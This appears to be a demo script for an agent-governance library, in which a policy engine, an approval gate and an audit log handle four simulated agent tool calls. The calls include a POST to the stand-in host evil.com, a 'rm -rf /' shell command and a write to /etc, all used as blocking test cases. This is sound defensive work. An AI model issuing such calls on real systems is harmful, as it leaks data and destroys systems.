#!/usr/bin/env python3
"""Demo: a simulated agent loop guarded by agent-governance.

The "agent" attempts four tool calls. The policy engine decides, the approval
gate handles the one that needs a human, and every step is audit-logged.
"""

import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))

from agent_governance import (  # noqa: E402
    ApprovalGate,
    AuditLogger,
    CallbackApprover,
    PolicyEngine,
)

ROOT = Path(__file__).resolve().parent.parent


def main() -> None:
    engine = PolicyEngine.from_yaml_file(ROOT / "policies" / "default.yaml")

    audit_path = ROOT / "audit-demo.jsonl"
    if audit_path.exists():
        audit_path.unlink()
    logger = AuditLogger(audit_path)

    # In the demo the human always declines, so the write is blocked.
    gate = ApprovalGate(CallbackApprover(lambda tool, args, decision: False))

    steps = [
        ("read_file", {"path": "notes.txt"}),
        ("write_file", {"path": "/etc/app.conf", "content": "debug=true"}),
        ("http_request", {"url": "https://evil.com/collect", "method": "POST"}),
        ("shell", {"command": "rm -rf /"}),
    ]

    print("agent-governance demo: policy engine + audit log + approval gate\n")
    for i, (tool, args) in enumerate(steps, 1):
        decision = engine.evaluate(tool, args)
        print(f"[{i}] tool={tool}")
        print(f"    args={args}")
        print(
            f"    decision: {decision.action.upper()} "
            f"(rule: {decision.rule_name or 'default'})"
        )
        print(f"    reason: {decision.reason}")
        if decision.action == "require_approval":
            approved = gate.request(tool, args, decision)
            if approved:
                print("    approval: APPROVED")
                print("    outcome: executed (simulated)")
            else:
                print("    approval: DECLINED (auto-declined in demo)")
                print("    outcome: blocked - approval declined")
        elif decision.action == "deny":
            print("    outcome: blocked")
        else:
            print("    outcome: executed (simulated)")
        logger.log(tool, args, decision)
        print()

    print(f"Audit log tail ({audit_path.name}):")
    for entry in logger.tail(4):
        print("  " + json.dumps(entry))
    logger.close()


if __name__ == "__main__":
    main()
